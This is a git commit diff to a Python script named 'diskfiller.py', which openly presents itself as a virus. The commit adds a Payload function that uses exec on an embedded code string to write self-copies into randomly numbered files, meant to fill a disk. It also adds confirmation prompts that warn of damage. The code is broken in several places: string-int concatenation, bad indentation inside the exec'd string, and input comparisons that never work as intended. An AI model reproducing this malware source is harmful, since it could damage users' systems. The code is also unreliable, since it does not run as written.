a9c8339707b653b03586f6a8734d3c82f44d2771
Vepsie <114414827+Vepsiee@users.noreply.github.com>
2022-10-12 20:41:56 +0100

    Update diskfiller.py (Make onefile)

--- diskfiller.py
+++ diskfiller.py
@@ -1,10 +1,36 @@
-from extras import Payload
 import sys
-###And yet it still doesnt work (Tested it on Kali)
+
+def Payload():
+   code = ("""
+        
+  from random import randint
+
+  random_int = randint(0, 10000)
+        
+  f = open("diskfiller" + int(random_int) + ".py", "w")
+  f.write(code)
+  f.close()
+
+
+
+  
+        
+        
+        
+  """)
+   exec(code)
+
+
+
+
+
 input("This could damage or destroy your computer, use at own risk. This virus can produce 1-10000 self-replicating files. Please undestand i am not responsible for any damages. Would you like to proceed in the execution? (Yes/n)")
 
 if input == "Yes":
-    Payload()
+    input("Are you sure?")
+    if input == "Yes" or "yes":
+        Payload()
+    
     
 if input == "N" or "n" or "No":
     sys.exit()
